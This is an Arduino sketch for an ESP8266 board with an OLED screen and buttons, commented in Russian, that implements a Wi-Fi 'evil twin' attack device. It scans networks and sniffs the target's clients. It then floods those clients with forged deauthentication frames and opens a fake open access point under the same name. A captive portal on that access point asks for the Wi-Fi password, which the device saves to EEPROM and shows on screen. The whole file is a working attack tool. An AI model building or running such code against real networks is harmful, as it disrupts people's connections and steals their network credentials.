#include <Wire.h>
#include <Adafruit_GFX.h>
#include <Adafruit_SSD1306.h>
#include <ESP8266WiFi.h>
#include <vector>
#include <Arduino.h>
#include <ESPAsyncWebServer.h>
#include <DNSServer.h>
#include <EEPROM.h>
#include <Ticker.h>


// Глобавльные переменные
Ticker apDisconnectTicker;

std::vector<String> knownClients;  // Маки клиентов

String capturedPassword = "";  // Пароль


// Дисплей
#define EEPROM_SIZE 64
#define SCREEN_WIDTH 128
#define SCREEN_HEIGHT 64
#define OLED_RESET -1
#define SCREEN_ADDRESS 0x3C 

// Пины кнопок
#define BTN_UP 14  // D5 (GPIO14)
#define BTN_DOWN 13  // D7 (GPIO13)
#define BTN_SELECT 12  // D6 (GPIO12)


Adafruit_SSD1306 display(SCREEN_WIDTH, SCREEN_HEIGHT, &Wire, OLED_RESET);

bool isScanningClients = false;

// Настройки AP
DNSServer dnsServer;
AsyncWebServer server(80);

const char* menuItems[] = {"Start scan", "Deauth count"};
const int menuSize = sizeof(menuItems) / sizeof(menuItems[0]);
int menuIndex = 0;


// Структура мак заголовка (Фрейм)
struct wifi_ieee80211_mac_hdr_t {
  uint8_t frame_ctrl[2];
  uint8_t duration[2];
  uint8_t addr1[6];  // Адрес назначения
  uint8_t addr2[6];  // Адрес отправителя (клиент)
  uint8_t addr3[6];  // BSSID (адрес точки доступа)
};

// Структура мак заголовка (пакет)
struct wifi_ieee80211_packet_t {
  struct wifi_ieee80211_mac_hdr_t hdr;
};

// Структура WIFI сети (информация о найденой сети)
struct WiFiNetwork {
  String ssid;
  int rssi;
  uint8_t bssid[6];  // Добавляем BSSID
  int channel;       // Добавляем номер канала
};

// Структура для хранения мака клиента
struct ClientInfo {
  uint8_t mac[6];
};

ClientInfo clients[50];
int clientCount = 0;
uint8_t targetBSSID[6];

WiFiNetwork wifiNetworks[20];
int networkCount = 0;
int selectedNetwork = 0;
int displayStartIndex = 0;
int deauthCount = 50;  // Значение по умолчанию (Пакеты деаутентификации)


// Cохраняет пароль в EEPROM
void savePasswordToEEPROM(const String &password) {
    Serial.println("Сохранение пароля в EEPROM...");

    EEPROM.begin(EEPROM_SIZE);

    for (int i = 0; i < password.length(); i++) {
        EEPROM.write(i, password[i]);
    }
    EEPROM.write(password.length(), '\0'); 
    EEPROM.commit(); 
    Serial.println("Пароль успешно сохранен в EEPROM.");
}

// Читает из EEPROM
String readPasswordFromEEPROM() {
    Serial.println("Чтение пароля из EEPROM...");

    EEPROM.begin(64);
    char password[33];
    
    for (int i = 0; i < 32; i++) {
        password[i] = EEPROM.read(i);
        if (password[i] == '\0' || password[i] == 255) break; 
    }
    password[32] = '\0';

    Serial.printf("Прочитанный пароль: %s\n", password);
    return String(password);
}

// Вывод пароля на дисплей 
void displayPassword(const String &password) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(10, 10);
    display.println("Wi-Fi Password:");
    display.setCursor(10, 30);
    display.setTextSize(2);
    
    if (password.length() > 16) {  
        display.println(password.substring(0, 16));
    } else {
        display.println(password);
    }

    display.display();
}

// Логика атаки (сканирование сетей не указано)
void startAttack(uint8_t *bssid, int channel) {
    Serial.println("Starting attack process...");

    // Сканирование клиентов в сети bssid
    scanClientsInNetwork(bssid, channel);

    delay(1000);

    // Поднятие AP
    startCaptivePortal(wifiNetworks[selectedNetwork].ssid.c_str(), channel); 

}

// Деаутентификация
void sendDeauthPackets(uint8_t *clientMAC, uint8_t *bssid, int deauthCount) {
    uint8_t deauthPacket[26] = {
        0xC0, 0x00, // Frame Control: Deauth
        0x00, 0x00, // Duration
        0, 0, 0, 0, 0, 0, // Destination MAC (Client)
        0, 0, 0, 0, 0, 0, // Source MAC (BSSID)
        0, 0, 0, 0, 0, 0, // BSSID
        0x00, 0x00, // Sequence number
        0x07, 0x00  // Reason code (7: Class 3 frame received from nonassociated STA)
    };

    // Формирование пакета
    memcpy(&deauthPacket[4], clientMAC, 6);  // MAC клиента
    memcpy(&deauthPacket[10], bssid, 6);     // MAC точки доступа (source)
    memcpy(&deauthPacket[16], bssid, 6);     // MAC точки доступа (BSSID)

    for (int i = 0; i < deauthCount; i++) {
        int result = wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);
        if (result == 0) {
            Serial.printf("Deauth packet sent to: %02X:%02X:%02X:%02X:%02X:%02X\n",
                          clientMAC[0], clientMAC[1], clientMAC[2],
                          clientMAC[3], clientMAC[4], clientMAC[5]);
        } else {
            Serial.println("Error sending deauth packet!");
        }
        delay(100);
    }
}

// Функция для преобразования MAC-адреса из строки в массив байтов
bool stringToMac(const String& macStr, uint8_t* macArray) {
  if (macStr.length() != 17) return false;  // MAC должен быть 17 символов XX:XX:XX:XX:XX:XX

  for (int i = 0; i < 6; i++) {
    macArray[i] = (uint8_t) strtol(macStr.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
  return true;
}

// Сканирование клиенто в сети
void scanClientsInNetwork(uint8_t *bssid, int channel) {
  Serial.println("Starting client scan...");

  Serial.print("Scanning on channel: ");
  Serial.println(channel);
  Serial.print("Target BSSID: ");
  for (int i = 0; i < 6; i++) {
    Serial.printf("%02X", bssid[i]);
    if (i < 5) Serial.print(":");
  }
  Serial.println();

  WiFi.disconnect();
  WiFi.mode(WIFI_STA);
  wifi_set_channel(channel);
  wifi_promiscuous_enable(false);
  memcpy(targetBSSID, bssid, 6);

  knownClients.clear();
  clientCount = 0;
  isScanningClients = true;

  wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
    if (!isScanningClients) return;
    if (len < sizeof(wifi_ieee80211_mac_hdr_t)) return;

    auto *packet = (wifi_ieee80211_packet_t*)(buf + 12);
    auto *hdr = &packet->hdr;

    if (memcmp(hdr->addr3, targetBSSID, 6) == 0) {
      if (memcmp(hdr->addr2, targetBSSID, 6) != 0) {
        char clientMac[18];
        snprintf(clientMac, sizeof(clientMac), "%02X:%02X:%02X:%02X:%02X:%02X",
                 hdr->addr2[0], hdr->addr2[1], hdr->addr2[2],
                 hdr->addr2[3], hdr->addr2[4], hdr->addr2[5]);

        if (std::find(knownClients.begin(), knownClients.end(), clientMac) == knownClients.end()) {
          knownClients.push_back(String(clientMac));
          Serial.print("Client MAC found: ");
          Serial.println(clientMac);
          clientCount++;
        }
      }
    }
  });

  wifi_promiscuous_enable(true);
  Serial.println("Scanning clients for 10 seconds...");
  delay(10000);
  wifi_promiscuous_enable(false);
  isScanningClients = false;

  Serial.printf("Client scan completed. Total clients found: %d\n", clientCount);

  display.clearDisplay();
  display.setCursor(0, 10);
  if (clientCount == 0) {
    display.println("No clients found.");
    Serial.println("No clients found.");
  } else {
    display.printf("Clients: %d", clientCount);
    Serial.printf("Clients found: %d\n", clientCount);
  }

  display.setCursor(0, 30);
  display.println("Starting Deauth Attack...");
  display.display();
  delay(3000);

  // Если есть клиенты, выполнить атаку по очереди
  if (clientCount > 0) {
    uint8_t clientMAC[6];
    int numClients = knownClients.size();
    for (int i = 0; i < deauthCount; i++) {
      int clientIndex = i % numClients; // Циклическое переключение между клиентами
      if (stringToMac(knownClients[clientIndex], clientMAC)) {
        sendDeauthPackets(clientMAC, bssid, 1); // Отправка 1 пакета на текущего клиента
      } else {
        Serial.printf("Invalid MAC format for client: %s, skipping...\n", knownClients[clientIndex].c_str());
      }
      delay(100);
    }
    Serial.println("Round-robin Deauth attack completed.");
  } else {
    Serial.println("No clients found. Attack skipped.");
  }
}

// Вывод лого 
void showLogo() {
  display.clearDisplay();
  display.setTextSize(2);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(20, 25);
  display.println("unit3301");
  display.display();
  delay(1500);
}

// Меню
void updateMenu() {
  Serial.println("Updating menu...");
  display.clearDisplay();
  display.setTextSize(1);
  display.setTextColor(SSD1306_WHITE);
  display.setCursor(0, 10);
  display.println("Menu:");
  for (int i = 0; i < menuSize; i++) {
    if (i == menuIndex) {
      display.print(" > ");
    } else {
      display.print("   ");
    }
    display.println(menuItems[i]);
  }
  display.display();
}

// Формирования пакетов deauth (константа)
void adjustDeauthCount() {
    Serial.println("Adjusting deauth count...");
    delay(500);

    while (true) {
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(0, 10);
        display.println("Set Deauth Count:");
        display.setCursor(40, 30);
        display.setTextSize(2);
        display.print(deauthCount);
        display.display();

        if (digitalRead(BTN_UP) == LOW) {
            deauthCount += 10;
            Serial.printf("Deauth count increased: %d\n", deauthCount);
            delay(300);  // Антидребезг
        }
        if (digitalRead(BTN_DOWN) == LOW) {
            if (deauthCount > 10) deauthCount -= 10;
            Serial.printf("Deauth count decreased: %d\n", deauthCount);
            delay(300);  // Антидребезг
        }
        if (digitalRead(BTN_SELECT) == LOW) {
            Serial.println("Exiting deauth count adjustment.");
            delay(300);  // Антидребезг
            return;
        }
    }
}

// Сканирование сетей
void scanWiFiNetworks() {
  Serial.println("Scanning Wi-Fi networks...");
  display.clearDisplay();
  display.setCursor(0, 10);
  display.println("Scanning Wi-Fi...");
  display.display();
  
  networkCount = WiFi.scanNetworks();
  Serial.printf("Found %d networks.\n", networkCount);

  for (int i = 0; i < networkCount && i < 20; i++) {
    wifiNetworks[i].ssid = WiFi.SSID(i);
    wifiNetworks[i].rssi = WiFi.RSSI(i);

    // Получаем BSSID (MAC адрес точки доступа)
    memcpy(wifiNetworks[i].bssid, WiFi.BSSID(i), 6);

    // Получаем канал точки доступа
    wifiNetworks[i].channel = WiFi.channel(i);

    Serial.printf("SSID: %s, RSSI: %d, BSSID: %02X:%02X:%02X:%02X:%02X:%02X, Channel: %d\n",
                  wifiNetworks[i].ssid.c_str(),
                  wifiNetworks[i].rssi,
                  wifiNetworks[i].bssid[0], wifiNetworks[i].bssid[1], wifiNetworks[i].bssid[2],
                  wifiNetworks[i].bssid[3], wifiNetworks[i].bssid[4], wifiNetworks[i].bssid[5],
                  wifiNetworks[i].channel);
  }

  // Сортировка сетей по уровню сигнала (RSSI) методом пузырька
  for (int i = 0; i < networkCount - 1; i++) {
    for (int j = 0; j < networkCount - i - 1; j++) {
      if (wifiNetworks[j].rssi < wifiNetworks[j + 1].rssi) {
        WiFiNetwork temp = wifiNetworks[j];
        wifiNetworks[j] = wifiNetworks[j + 1];
        wifiNetworks[j + 1] = temp;
      }
    }
  }

  Serial.println("Networks sorted by RSSI (highest first):");
  for (int i = 0; i < networkCount; i++) {
    Serial.printf("SSID: %s, RSSI: %d\n", wifiNetworks[i].ssid.c_str(), wifiNetworks[i].rssi);
  }

  selectNetworkMenu();
}

// Выбор сети
void selectNetworkMenu() {
  Serial.println("Selecting network...");
  selectedNetwork = 0;
  displayStartIndex = 0;

  while (true) {
    display.clearDisplay();
    display.setTextSize(1);
    display.setCursor(0, 0);
    display.print("Networks found: ");
    display.println(networkCount);

    for (int i = displayStartIndex; i < displayStartIndex + 5 && i < networkCount; i++) {
      if (i == selectedNetwork) {
        display.print(" > ");
      } else {
        display.print("   ");
      }
      display.println(wifiNetworks[i].ssid);
    }
    display.display();

    // Обработка кнопки ВВЕРХ
    if (digitalRead(BTN_UP) == LOW) {
      if (selectedNetwork > 0) {
        selectedNetwork--;
        if (selectedNetwork < displayStartIndex) {
          displayStartIndex--;
        }
      }
      Serial.printf("Moved up to: %s\n", wifiNetworks[selectedNetwork].ssid.c_str());
      delay(300);  // Антидребезг
    }

    // Обработка кнопки ВНИЗ
    if (digitalRead(BTN_DOWN) == LOW) {
      if (selectedNetwork < networkCount - 1) {
        selectedNetwork++;
        if (selectedNetwork >= displayStartIndex + 5) {
          displayStartIndex++;
        }
      }
      Serial.printf("Moved down to: %s\n", wifiNetworks[selectedNetwork].ssid.c_str());
      delay(300);  // Антидребезг
    }

    // Обработка кнопки ВЫБОР
    if (digitalRead(BTN_SELECT) == LOW) {
      Serial.println("Network selected:");
      Serial.println(wifiNetworks[selectedNetwork].ssid);

      display.clearDisplay();
      display.setTextSize(1);
      display.setCursor(20, 25);
      display.println("Scanning clients..");
      display.display();

      delay(2000);
      startAttack(wifiNetworks[selectedNetwork].bssid, wifiNetworks[selectedNetwork].channel);
      return;
    }
  }
}

// Формирование и запуск AP
void startCaptivePortal(const char *ssid, int channel) {
    Serial.println("\nStarting Fake Access Point...");

    // Поднимаем точку доступа с заданным SSID, паролем и каналом

    //WiFi.softAP(ssid, "", channel)) 
    if (WiFi.softAP(ssid, "", channel))  {
        Serial.println("Access Point Started!");
        Serial.print("AP SSID: ");
        Serial.println(ssid);
        Serial.print("AP Channel: ");
        Serial.println(channel);
        Serial.print("AP IP Address: ");
        Serial.println(WiFi.softAPIP());
    } else {
        Serial.println("Failed to start AP!");
        return;
    }

    // Запускаем DNS-захват (перенаправление всех запросов на Captive Portal)
    dnsServer.start(53, "*", WiFi.softAPIP());

    // Настраиваем Captive Portal
    server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    Serial.println("[CaptivePortal] iOS Captive Portal request detected.");
    request->send(200, "text/html",
                  "<html><body>"
                  "<h1>Welcome to Free Wi-Fi</h1>"
                  "<p>Enter your Wi-Fi credentials:</p>"
                  "<form action='/submit' method='POST'>" // 1. Должен быть метод POST
                  "<label>Password:</label><br>"
                  "<input type='password' name='password' required><br><br>"
                  "<input type='submit' value='Connect'>"
                  "</form>"
                  "</body></html>");
    });

    // Обработчик отправки пароля
    server.on("/submit", HTTP_POST, [](AsyncWebServerRequest *request) {
    Serial.println("[CaptivePortal] Handling password submission...");
    
    if (request->hasArg("password")) {
        String capturedPassword = request->arg("password");
        Serial.printf("Captured Password: %s\n", capturedPassword.c_str());

        savePasswordToEEPROM(capturedPassword);  // Сохранение в EEPROM
        Serial.println("Пароль сохранен в EEPROM.");
        
        // Немедленная перезагрузка платы
        delay(100);  // Небольшая задержка, чтобы дать время отправке ответа
        ESP.restart();  // Перезагрузка платы
        
        return;  // **Завершаем выполнение обработчика**
    } 

    Serial.println("Ошибка: параметр 'password' не найден!");
    request->send(400, "text/html", "<h1>Error: No password provided.</h1>");
    });

    // Обрабатываем неизвестные запросы (редиректим на Captive Portal)
    server.onNotFound([](AsyncWebServerRequest *request) {
    Serial.println("[CaptivePortal] Redirecting unknown request to /hotspot-detect.html");
    request->redirect("/hotspot-detect.html");
    });

    // Запускаем веб-сервер
    server.begin();
    Serial.println("Captive Portal started.");
}


void setup() {
  Serial.begin(115200);
  Serial.println("Starting setup...");

  delay(500);

    // Инициализация EEPROM
    EEPROM.begin(64);

    delay(500);

    // Инициализация дисплея
    if (!display.begin(SSD1306_SWITCHCAPVCC, SCREEN_ADDRESS)) {
        Serial.println("Ошибка инициализации дисплея!");
        while (true);
    }

    display.clearDisplay();
    display.display();

    delay(2000);
  
  pinMode(BTN_UP, INPUT_PULLUP);
  pinMode(BTN_DOWN, INPUT_PULLUP);
  pinMode(BTN_SELECT, INPUT_PULLUP);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();

  
  showLogo();

    String storedPassword = readPasswordFromEEPROM();

    if (storedPassword.length() > 0) {
        Serial.print("Stored Password: ");
        Serial.println(storedPassword);
        displayPassword(storedPassword);  // Выводим пароль на дисплей
        
        delay(5000);

        // **Убираем updateMenu() пока тестируем**
        // updateMenu();
    } else {
        Serial.println("No password saved.");
        display.clearDisplay();
        display.setTextSize(1);
        display.setCursor(10, 20);
        display.println("No password saved.");
        display.display();

        delay(5000);
    }

  updateMenu();
}

// Антидребезг
void waitForButtonRelease(int pin) {
  while (digitalRead(pin) == LOW) {
    delay(10);
  }
}

void loop() {
  dnsServer.processNextRequest();

  if (digitalRead(BTN_UP) == LOW) {
    delay(50);  // Антидребезг
    if (digitalRead(BTN_UP) == LOW) {
      menuIndex = (menuIndex - 1 + menuSize) % menuSize;
      Serial.println("BTN_UP pressed - moving up");
      updateMenu();
      waitForButtonRelease(BTN_UP);
    }
  }

  if (digitalRead(BTN_DOWN) == LOW) {
    delay(50);  // Антидребезг
    if (digitalRead(BTN_DOWN) == LOW) {
      menuIndex = (menuIndex + 1) % menuSize;
      Serial.println("BTN_DOWN pressed - moving down");
      updateMenu();
      waitForButtonRelease(BTN_DOWN);
    }
  }

  if (digitalRead(BTN_SELECT) == LOW) {
    delay(50);  // Антидребезг
    if (digitalRead(BTN_SELECT) == LOW) {
      Serial.println("BTN_SELECT pressed - selecting option");
      if (menuIndex == 0) {
        Serial.println("Starting Wi-Fi scan...");
        scanWiFiNetworks();
      } else if (menuIndex == 1) {
        Serial.println("Adjusting deauth count...");
        adjustDeauthCount();
      }
      updateMenu();
      waitForButtonRelease(BTN_SELECT);
    }
  }
}
